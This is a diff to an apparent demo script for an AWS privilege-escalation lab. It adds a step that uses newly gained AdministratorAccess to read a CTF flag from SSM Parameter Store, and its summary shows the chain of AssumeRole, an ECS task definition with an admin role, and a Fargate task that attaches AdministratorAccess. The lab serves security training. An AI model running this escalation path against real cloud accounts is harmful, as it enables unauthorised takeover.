@@ -489,6 +489,24 @@ else
 fi
 echo ""
 
+# [EXPLOIT] Step 16: Capture the CTF flag
+# The starting user now has AdministratorAccess attached, which grants ssm:GetParameter
+# implicitly. Use those credentials to read the scenario flag from SSM Parameter Store.
+use_starting_creds
+export AWS_REGION=$AWS_REGION
+echo -e "${YELLOW}Step 16: Capturing CTF flag from SSM Parameter Store${NC}"
+FLAG_PARAM_NAME="/pathfinding-labs/flags/sts-001-to-ecs-002-to-admin-to-admin"
+show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
+
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}[OK] Flag captured: ${FLAG_VALUE}${NC}"
+else
+    echo -e "${RED}[FAIL] Failed to read flag from $FLAG_PARAM_NAME${NC}"
+    exit 1
+fi
+echo ""
+
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
     for cmd in "${ATTACK_COMMANDS[@]}"; do
@@ -501,7 +519,7 @@ fi
 restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}MULTI-HOP PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER"
@@ -517,6 +535,7 @@ echo "   - Registered task definition with admin role: $ADMIN_ROLE"
 echo "   - Ran ECS Fargate task that attached AdministratorAccess to starting user"
 echo ""
 echo "4. Achieved: Full administrator access for $STARTING_USER"
+echo "5. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Attack Path Diagram:${NC}"
 echo -e "  $STARTING_USER"
@@ -539,6 +558,10 @@ echo -e "  ECS Task [attaches admin policy to starting user]"
 echo -e "  |"
 echo -e "  v"
 echo -e "  $STARTING_USER -> ADMIN ACCESS"
+echo -e "  |"
+echo -e "  | (ssm:GetParameter)"
+echo -e "  v"
+echo -e "  CTF Flag: $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Why This Works:${NC}"
 echo "- sts:AssumeRole allows the starting user to become the intermediate role"
